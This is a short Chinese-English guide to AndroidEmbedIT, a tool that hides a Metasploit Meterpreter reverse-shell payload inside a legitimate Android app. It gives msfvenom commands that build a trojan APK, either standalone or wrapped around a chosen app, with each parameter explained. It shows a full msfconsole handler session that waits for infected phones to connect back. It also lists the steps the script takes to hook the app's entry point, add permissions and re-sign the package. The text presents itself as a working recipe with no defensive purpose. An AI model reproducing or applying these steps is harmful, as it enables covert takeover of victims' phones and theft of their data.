## AndroidEmbedIT可以配合meterpreter生成的木马msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.169.76 lport=445 R > Desktop/123.apk进行
或（msfvenom -x you .apk -p android/meterpreter/reverse_tcp LHOST=youip LPORT=5554 -o aa.apk

参数说明：

you.apk (刚才下载的app名称)

youip:(你的ip地址 通过ipconfig命令查看)

5555:本地端口

-o:生成新的APP 这里生成的是aa.apk


）


监听
root@kali:~# msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp #设置payload
payload => android/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.169.76 #kali的IP
lhost => 192.168.169.76
msf exploit(handler) > set lport 445 #对应刚才设的端口
lport => 445
msf exploit(handler) > exploit


This script performs the following actions to embed a Metasploit
generated APK file into another legitimate APK.

* decompiles a Metasploit APK file, and any other APK file.
* locates the main Activity entrypoint in the APK being targeted
* copies all Metasploit APK staging code to destination APK
* adjusts the main Activity entrypoint smali file with an *invoke-static* call to kick off the Metasploit stage.
* adjusts the final AndroidManifest.xml with appropriate added permissions
* recompiles, and resigns the final APK file.

All actions are performed within the "~/.ae" directory which is created
during runtime.   The script requires that *keytool*, *jarsigner*, and *apktool*
are installed.  A KALI distribution will work well to run this script on.

